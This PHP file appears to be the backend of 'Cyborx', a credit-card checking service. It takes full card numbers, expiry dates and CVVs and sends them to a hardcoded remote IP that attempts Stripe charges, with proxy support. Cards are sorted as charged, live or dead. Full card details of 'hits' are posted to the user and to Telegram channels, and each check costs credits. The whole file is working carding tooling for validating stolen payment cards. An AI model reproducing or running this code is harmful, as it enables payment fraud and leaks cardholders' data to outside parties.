<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted path
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
header('Content-Type: application/json; charset=utf-8');
use App\Db;
use App\Telegram;

if (empty($_SESSION['uid'])) {
    http_response_code(401);
    echo json_encode(['Response' => 'Session expired']);
    exit;
}

$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);
// Fetch user details
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, credits FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$userData) {
    echo json_encode(['Response' => 'User not found']);
    exit;
}
$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentCredits = (int)$userData['credits'];
if ($userStatus === 'BANNED') {
    echo json_encode(['Response' => 'You are banned from using Cyborx.']);
    exit;
}

if ($currentCredits < 2) { // Adjusted to 2 credits for NonSK Charge
    echo json_encode(['Response' => 'Insufficient Credits']);
    exit;
}
// Proxy setup from separate GET parameters
$proxyHost = $_GET['host'] ?? '';
$proxyPort = (int)($_GET['port'] ?? 0);
$proxyUsername = $_GET['user'] ?? '';
$proxyPassword = $_GET['pass'] ?? '';
// Validate proxy fields
if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    if (empty($proxyHost) || $proxyPort <= 0) {
        echo json_encode(['Response' => 'Invalid Proxy Format: Host and Port are required']);
        exit;
    }
    $fullProxy = "$proxyHost:$proxyPort:$proxyUsername:$proxyPassword"; // Format for API
} else {
    $fullProxy = '';
}
// Define $proxyRequired based on GET parameter
$proxyRequired = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
// ---------- Validate input ----------
$cc1 = $_GET['cc'] ?? '';
$ccParts = explode('|', $cc1);
$cc = trim($ccParts[0] ?? '');
$month = trim($ccParts[1] ?? '');
$year = trim($ccParts[2] ?? '');
$cvv = trim($ccParts[3] ?? '');
if (empty($cc1) || !preg_match('/\d{15,16}[|:\/\s]\d{1,2}[|:\/\s]\d{2,4}[|:\/\s]\d{3,4}/', $cc1)) {
    echo json_encode(['Response' => 'Invalid Card Format']);
    exit;
}
// Normalize year
$yearLength = strlen($year);
if ($yearLength <= 2) {
    $year = "20" . $year;
}
// Map month to two digits
$month = sprintf('%02d', (int)$month);
// ---------- helpers ----------
function generateUserAgent() {
    $browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    ];
    return $browsers[array_rand($browsers)];
}
function getBinInfo($binNumber, $ch) {
    $url = "https://bins.antipublic.cc/bins/{$binNumber}";
    $headers = [
        'Accept: application/json',
        'User-Agent: ' . generateUserAgent(),
    ];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $binData = json_decode($response, true) ?: [];
    return [
        'brand' => $binData['brand'] ?? 'UNKNOWN',
        'card_type' => $binData['type'] ?? 'UNKNOWN',
        'level' => $binData['level'] ?? 'STANDARD',
        'issuer' => $binData['bank'] ?? 'Unknown',
        'country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')
    ];
}
function updateCredits($pdo, $uid, $deduct, $isLive = false, $isCharged = false) {
    global $currentCredits;
    $newCredits = max(0, $currentCredits - $deduct);
    $lives = $isLive ? 1 : 0;
    $charges = $isCharged ? 1 : 0;
    $stmt = $pdo->prepare("UPDATE users SET credits = ?, lives = lives + ?, charges = charges + ? WHERE id = ?");
    $stmt->execute([$newCredits, $lives, $charges, $uid]);
    return $newCredits;
}
function sendTelegramMessage($botToken, $chatId, $messageHtml) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $messageHtml,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}
// Fetch bot token from .env
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {
    echo json_encode(['Response' => 'Bot token missing in config']);
    exit;
}
// ---------- BIN info (use its own curl handle) ----------
$chBin = curl_init();
curl_setopt($chBin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chBin, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($chBin, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($chBin, CURLOPT_SSL_VERIFYHOST, false);
$bin = substr($cc, 0, 6);
$binInfo = getBinInfo($bin, $chBin);
curl_close($chBin);

// List of banned BINs
$bannedBins = [
    '416021',
    '533317',
    '529621'
    // you can add more here...
];

if (in_array($bin, $bannedBins)) {
    echo json_encode(['Response' => 'BIN BANNED ❌']);
    exit;
}



// ---------- Request to external API (separate handle) ----------
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
$requestUrl = "http://51.79.209.54:8001/?cc={$cc}|{$month}|{$year}|{$cvv}";
if ($proxyRequired) {
    $requestUrl .= "&proxy={$fullProxy}";
}
// Fetch BIN information
$brand = $binInfo['brand'];
$card_type = $binInfo['card_type'];
$level = $binInfo['level'];
$issuer = $binInfo['issuer'];
$country_info = $binInfo['country_info'];

if (strtoupper($level) === 'PREPAID') {
    echo json_encode(['Response' => 'Prepaid Bins are not Allowed ❌']);
    exit;
}



curl_setopt($ch, CURLOPT_URL, $requestUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: en-US,en;q=0.9',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Pragma: no-cache',
    'Upgrade-Insecure-Requests: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);
// Process response
// $file = "nonskcc_responses.txt";
// $handle = fopen($file, "a");
// $content = "cc = $cc1\nresponse = $response\n\n";
// fwrite($handle, $content);
// fclose($handle);
$responseData = json_decode($response, true);
$dead_responses = [
    "generic_decline" => "Generic Decline",
    "card_decline_rate_limit_exceeded" => "Card was declined",
    "CARD_GENERIC_ERROR" => "Card was declined",
    "Your card was declined." => "Your card was declined.",
    "do_not_honor" => "Do Not Honor ❌",
    "Invalid account." => "Invalid Account ❌",
    "fraudulent" => "Fraudulent ❌",
    "setup_intent_authentication_failure" => "setup_intent_authentication_failure ❌",
    "invalid_cvc" => "Invalid CVC ❌",
    "stolen_card" => "Stolen Card ❌",
    "lost_card" => "Lost Card ❌",
    "pickup_card" => "Pickup Card ❌",
    "incorrect_number" => "Incorrect Card Number ❌",
    "Your card has expired." => "Expired Card ❌",
    "expired_card" => "Expired Card ❌",
    "intent_confirmation_challenge" => "intent_confirmation_challenge ❌",
    "Your card number is incorrect." => "Incorrect Card Number ❌",
    "An error occurred while processing the card." => "Error Occurred ❌",
    "Your card's expiration year is invalid." => "Expiration Year Invalid ❌",
    "Your card's expiration month is invalid." => "Expiration Month Invalid ❌",
    "invalid_expiry_month" => "Expiration Month Invalid ❌",
    "card is not supported." => "Card Not Supported ❌",
    "invalid_account" => "Dead Card ❌",
    "Invalid API Key provided" => "stripe error . contact support@stripe.com for more details ❌",
    "testmode_charges_only" => "stripe error . contact support@stripe.com for more details ❌",
    "api_key_expired" => "stripe error . contact support@stripe.com for more details ❌",
    "Your account cannot currently make live charges." => "stripe error . contact support@stripe.com for more details ❌",
    "ProxyError" => "Proxy Connection Refused"
];
// Check for Charged response first
if ((stripos($response, 'Payment Successful') !== false)) {
    $err = 'Payment Successful!';
    $new_credits = updateCredits($pdo, $uid, 5, false, true);
    $fullResult =
        "<b>#NonSKCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b>Charged 🔥</b>\n" .
        "<b>Response ➜</b> {$err} 🎉\n" .
        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
    echo json_encode([
        'status' => 'charge',
        'Response' => $err,
        'Gateway' => 'NonSK Charge (Stripe)',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
}
// Check for Live responses
elseif (stripos($response, 'requires_action') !== false) {
    $err = '3DS Required';
    $new_credits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult =
        "<b>#NonSKCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b> Live ✅</b>\n" .
        "<b>Response ➜</b> {$err}\n" .
        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'NonSK Charge (Stripe)',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
} elseif (
    stripos($response, 'insufficient_funds') !== false ||
    stripos($response, 'card has insufficient funds.') !== false ||
    stripos($response, 'INSUFFICIENT_FUNDS') !== false
) {
    $err = 'Insufficient Funds 💰';
    $new_credits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult =
        "<b>#NonSKCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b> Live ✅</b>\n" .
        "<b>Response ➜</b> {$err}\n" .
        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'NonSK Charge (Stripe)',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
} elseif (
    stripos($response, 'incorrect_cvc') !== false ||
    stripos($response, 'security code is incorrect.') !== false ||
    stripos($response, 'Your card\'s security code is incorrect.') !== false ||
    stripos($response, 'INVALID SECURITY CODE') !== false
) {
    $err = 'Incorrect CVC ❎';
    $new_credits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult =
        "<b>#NonSKCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b> Live ✅</b>\n" .
        "<b>Response ➜</b> {$err}\n" .
        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'NonSK Charge (Stripe)',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
} elseif (
    stripos($response, 'transaction_not_allowed') !== false ||
    stripos($response, 'Your card does not support this type of purchase') !== false
) {
    $err = 'Card Doesn\'t Support Currency ⚠️';
    $new_credits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult =
        "<b>#NonSKCharge</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ➜</b> <b> Live ✅</b>\n" .
        "<b>Response ➜</b> {$err}\n" .
        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
        "━━━━━━━━\n" .
        "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'NonSK Charge (Stripe)',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    exit;
} else {
    // Check for dead responses
    $deadFound = false;
    foreach ($dead_responses as $deadKey => $deadValue) {
        if (stripos($response, $deadKey) !== false) {
            $err = $deadValue;
            $deadFound = true;
            break;
        }
    }
    if ($deadFound) {
        $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for dead
        echo json_encode([
            'status' => 'dead',
            'Response' => $err,
            'Gateway' => 'NonSK Charge (Stripe)',
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $brand,
            'card_type' => $card_type,
            'level' => $level,
            'issuer' => $issuer,
            'country_info' => $country_info
        ]);
        exit;
    } else {
        $err = 'Proxy/Others Issue';
        $new_credits = updateCredits($pdo, $uid, 0);
        echo json_encode([
            'status' => 'dead',
            'Response' => $err,
            'Gateway' => 'NonSK Charge (Stripe)',
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $brand,
            'card_type' => $card_type,
            'level' => $level,
            'issuer' => $issuer,
            'country_info' => $country_info
        ]);
        exit;
    }
}
?>